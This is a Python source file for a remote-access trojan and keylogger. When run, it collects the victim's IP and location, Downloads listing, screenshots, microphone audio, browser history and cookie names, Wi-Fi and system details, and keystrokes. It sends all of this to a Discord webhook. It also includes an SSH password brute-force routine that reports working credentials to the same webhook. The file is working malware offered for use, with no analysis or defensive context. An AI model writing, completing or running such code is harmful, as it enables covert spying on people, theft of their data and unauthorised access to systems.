import subprocess
import sys
import os
import requests
import pyautogui
import keyboard
import psutil  # For system monitoring
import cv2  # For webcam capture
import pyaudio  # For audio recording
import wave
import sqlite3
import paramiko
from shutil import copyfile
import psutil
import time

discord_webhook_url = "ENTER YOUR WEBHOOK HERE"

def send_to_discord(content, title=None):
    headers = {"Content-Type": "application/json"}
    if title:
        data = {"embeds": [{"title": title, "description": content, "color": 5814783}]}
    else:
        data = {"content": content}
    requests.post(discord_webhook_url, json=data, headers=headers)

def rat1():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        public_ip = response.json()['ip']
        send_to_discord(f"**Public IP:**\n```{public_ip}```", title="Public IP Address")
    except:
        pass

def rat10():
    try:
        response = requests.get(f"https://ipinfo.io/{requests.get('https://api.ipify.org').text}/geo")
        location_data = response.json()
        location_info = f"City: {location_data['city']}\nRegion: {location_data['region']}\nCountry: {location_data['country']}"
        send_to_discord(f"**Location Info:**\n```{location_info}```", title="Geolocation Info")
    except:
        pass

def system_monitor():
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        disk_usage = psutil.disk_usage('/')
        system_info = f"CPU Usage: {cpu_usage}%\nMemory Usage: {memory_info.percent}%\nDisk Usage: {disk_usage.percent}%"
        send_to_discord(f"**System Monitor:**\n```{system_info}```", title="System Monitor")
    except:
        pass

def rat2():
    try:
        downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
        if not os.path.exists(downloads_folder):
            send_to_discord("**Downloads folder does not exist.**", title="Downloads Check")
            return
        downloaded_files = os.listdir(downloads_folder)
        if not downloaded_files:
            send_to_discord("**No files found in the Downloads folder.**", title="Downloads Check")
            return
        file_list = "\n".join([f"- {file}" for file in downloaded_files])
        chunks = [file_list[i:i+1900] for i in range(0, len(file_list), 1900)]
        for chunk in chunks:
            send_to_discord(f"**Files in Downloads folder:**\n```{chunk}```", title="Downloads Folder")
    except:
        pass

def rat3():
    try:
        screenshot_path = "screenshot.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        with open(screenshot_path, "rb") as file:
            files = {"file": ("screenshot.png", file, "image/png")}
            requests.post(discord_webhook_url, files=files)
    except:
        pass

def rat5():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        img_path = 'webcam_image.png'
        if ret:
            cv2.imwrite(img_path, frame)
        cam.release()
        cv2.destroyAllWindows()
        with open(img_path, "rb") as file:
            files = {"file": ("webcam_image.png", file, "image/png")}
            requests.post(discord_webhook_url, files=files)
    except:
        pass

def rat6():
    try:
        process_list = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
            process_list.append(proc.info)
        process_list = sorted(process_list, key=lambda proc: proc['cpu_percent'], reverse=True)[:5]
        process_info = "\n".join([f"PID: {proc['pid']}, Name: {proc['name']}, CPU: {proc['cpu_percent']}%" for proc in process_list])
        send_to_discord(f"**Top 5 Processes by CPU Usage:**\n```{process_info}```", title="Top CPU-Consuming Processes")
    except:
        pass

def rat7():
    try:
        net_io = psutil.net_io_counters()
        network_info = f"Bytes Sent: {net_io.bytes_sent / (1024 * 1024):.2f} MB\nBytes Received: {net_io.bytes_recv / (1024 * 1024):.2f} MB"
        send_to_discord(f"**Network Traffic:**\n```{network_info}```", title="Network Traffic Stats")
    except:
        pass

def rat4():
    key_log = []
    def on_key_press(event):
        key = event.name
        key_log.append(key)
        if len(key_log) >= 10:
            key_string = "".join(key_log)
            send_to_discord(f"**Keys pressed:**\n```{key_string}```", title="Keylogger")
            key_log.clear()
    keyboard.on_press(on_key_press)
    keyboard.wait('esc') 


def rat13():
    try:
        if os.name == 'nt':  
            result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
            wifi_info = result.stdout
        else: 
            result = subprocess.run(["iwgetid"], capture_output=True, text=True)
            wifi_info = result.stdout
        send_to_discord(f"**Wi-Fi Information:**\n```{wifi_info}```", title="Wi-Fi Information")
    except:
        pass

def rat14():
    try:
        uname = os.uname()
        system_info = f"OS: {uname.sysname}\nNode Name: {uname.nodename}\nRelease: {uname.release}\nVersion: {uname.version}\nMachine: {uname.machine}"
        memory_info = psutil.virtual_memory()
        system_info += f"\nTotal Memory: {memory_info.total / (1024 ** 3):.2f} GB\nAvailable: {memory_info.available / (1024 ** 3):.2f} GB\nUsed: {memory_info.used / (1024 ** 3):.2f} GB\nPercent Used: {memory_info.percent}%"
        cpu_info = f"Physical cores: {psutil.cpu_count(logical=False)}\nTotal cores: {psutil.cpu_count(logical=True)}\nMax Frequency: {psutil.cpu_freq().max} MHz\nCurrent Frequency: {psutil.cpu_freq().current} MHz"
        send_to_discord(f"**System Info:**\n```{system_info}```\n**CPU Info:**\n```{cpu_info}```", title="System Information Overview")
    except:
        pass


def get_browser_history():
    try:
        user_profile = os.getenv("USERPROFILE") or os.getenv("HOME")
        history_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\History")
        
        if not os.path.exists(history_path):
            history_path = os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")

        if not os.path.exists(history_path):
            send_to_discord("Browser history file not found.")
            return

        temp_history = os.path.join(user_profile, "history_temp.db")
        copyfile(history_path, temp_history)

        conn = sqlite3.connect(temp_history)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 10")
        history = cursor.fetchall()
        history_str = "\n".join([f"Title: {row[1]}, URL: {row[0]}, Visits: {row[2]}" for row in history])

        send_to_discord(f"**Recent Browser History:**\n```{history_str}```", title="Browser History")
        conn.close()
        os.remove(temp_history)
    except Exception as e:
        send_to_discord(f"Failed to retrieve browser history: {e}")

def get_browser_cookies():
    try:
        user_profile = os.getenv("USERPROFILE") or os.getenv("HOME")
        cookies_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\Cookies")

        if not os.path.exists(cookies_path):
            cookies_path = os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies")

        if not os.path.exists(cookies_path):
            send_to_discord("Cookies file not found.")
            return

        temp_cookies = os.path.join(user_profile, "cookies_temp.db")
        copyfile(cookies_path, temp_cookies)

        conn = sqlite3.connect(temp_cookies)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name FROM cookies")

        cookies = cursor.fetchall()
        cookies_str = "\n".join([f"Domain: {row[0]}, Cookie Name: {row[1]}" for row in cookies])

        send_to_discord(f"**Browser Cookies:**\n```{cookies_str}```", title="Browser Cookies")
        conn.close()
        os.remove(temp_cookies)
    except Exception as e:
        send_to_discord(f"Failed to retrieve browser cookies: {e}")

def rat12(seconds=5):
    try:
        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 1
        fs = 44100
        filename = "audio.wav"
        p = pyaudio.PyAudio()
        stream = p.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
        frames = []
        for _ in range(0, int(fs / chunk * seconds)):
            data = stream.read(chunk)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(filename, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframes(b''.join(frames))
        wf.close()
        with open(filename, "rb") as file:
            files = {"file": ("audio.wav", file, "audio/wav")}
            requests.post(discord_webhook_url, files=files)
    except:
        pass

def ssh_brute_force(hostname, username, password_list_file):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(password_list_file, 'r') as file:
            passwords = file.readlines()
        for password in passwords:
            password = password.strip()
            try:
                ssh_client.connect(hostname, username=username, password=password)
                send_to_discord(f"Successful SSH login on {hostname} with username {username} and password {password}")
                return
            except paramiko.AuthenticationException:
                continue
    except:
        pass

def brute_force_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\nBrute Force Menu:")
        print("1. SSH Brute Force")
        print("2. Exit")
        choice = input("Enter choice: ")

        if choice == '1':
            hostname = input("Enter the target hostname or IP: ")
            username = input("Enter the username: ")
            password_list = input("Enter the path to the password list: ")
            ssh_brute_force(hostname, username, password_list)
        elif choice == '2':
            break
        else:
            print("Invalid choice. Please try again.")
        os.system('cls' if os.name == 'nt' else 'clear')


if __name__ == "__main__":

    os.system('cls' if os.name == 'nt' else 'clear')

   
    rat1()  # Grab public IP
    rat10()  # Get geolocation
    system_monitor()  # Monitor system activity
    rat2()  # List Downloads
    rat3()  # Take screenshot
    #rat5()  # Capture webcam image
    rat6()  # Get active processes
    rat7()  # Monitor network traffic
    rat13()  # Get Wi-Fi information
    rat14()  # Get system information overview
    rat12()  # Record audio
    get_browser_history()  # Get browser history
    get_browser_cookies()  # Get browser cookies
    rat4()  # Start keylogger

